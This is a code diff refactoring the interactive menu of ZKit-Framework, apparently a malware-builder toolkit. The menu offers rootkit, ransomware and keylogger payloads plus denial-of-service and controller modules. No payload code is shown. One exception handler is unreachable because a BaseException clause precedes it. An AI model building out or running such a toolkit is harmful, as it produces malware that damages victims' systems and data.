@@ -26,8 +26,6 @@ except (ImportError, ModuleNotFoundError) as e:
     )
     raise
 
-PAYLOAD_CHOICES = {'1': 'rootkit', '2': 'ransomware', '3': 'keylogger'}
-
 
 def list_builtin_payloads_helper(type_):
     payloads = list_builtin_payloads(type_)
@@ -48,7 +46,10 @@ def list_payloads_helper():
         Generate(list(payloads.values())[int(index) - 1])
 
 
-class start():
+PAYLOAD_CHOICES = {'1': 'rootkit', '2': 'ransomware', '3': 'keylogger'}
+
+
+class Start:
     def __init__(self):
         "Starts zkit with those beautiful menues"
         # Printing A Banner More Coming Soon
@@ -75,28 +76,28 @@ class start():
 
     def main_loop(self):
         while True:
-            try:
-                choice = str(input("..> "))
 
-                if choice == "000":
-                    break
+            choice = str(input("..> "))
 
-                if choice in PAYLOAD_CHOICES:
-                    for key in PAYLOAD_CHOICES:
-                        if key == choice:
-                            choice = choice.replace(
-                                key, PAYLOAD_CHOICES[key])
-                            list_builtin_payloads_helper(choice)
+            if choice == "000":
+                break
 
-                elif choice == "4":
-                    dos.Main()
-                elif choice == "5":
-                    ctrler.Main()
-                elif choice == "6":
-                    list_payloads_helper()
-                elif choice is not None:
-                    notify(
-                        "problem", "Invalid Input {" + "{}".format(choice) + "}")
+            if choice in PAYLOAD_CHOICES:
+                for key in PAYLOAD_CHOICES:
+                    if key == choice:
+                        choice = choice.replace(
+                            key, PAYLOAD_CHOICES[key])
+                        list_builtin_payloads_helper(choice)
+
+            elif choice == "4":
+                dos.Main()
+            elif choice == "5":
+                ctrler.Main()
+            elif choice == "6":
+                list_payloads_helper()
+            elif choice is not None:
+                notify(
+                    "problem", "Invalid Input {" + "{}".format(choice) + "}")
 
 
 try:
@@ -105,4 +106,3 @@ except BaseException as e:
     crash_handler(e)
 except (KeyboardInterrupt, EOFError):
     print("\nPlease Type '000' To Exit ZKit-Framework\n")
-    choice = None
